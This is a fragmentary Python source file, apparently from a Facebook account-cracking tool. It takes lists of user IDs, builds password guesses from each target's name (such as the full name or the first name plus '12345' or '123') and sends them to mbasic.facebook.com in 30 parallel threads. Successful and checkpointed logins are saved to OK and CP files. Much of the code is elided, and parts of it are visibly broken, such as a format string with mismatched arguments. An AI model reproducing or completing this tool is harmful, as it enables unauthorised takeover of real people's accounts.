...
from concurrent.futures import ThreadPoolExecutor as SOJIBSOJIB
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSOJIB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSOJIB_CP.txt' % (H, P, str(len(cp))))
...
def SOJIB():
    ...
    print(' [E] exit ')
    print('')
    _SOJIB___ = input(' [?] Choose option : ')
    if _SOJIB___ in ('1', '01'):
        __xxx__().SOJIBx(id)
    if _SOJIB___ in ('2', '02'):
        create_file()
    if _SOJIB___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with SOJIBSOJIB(max_workers=30) as SOJIBworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        SOJIBworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
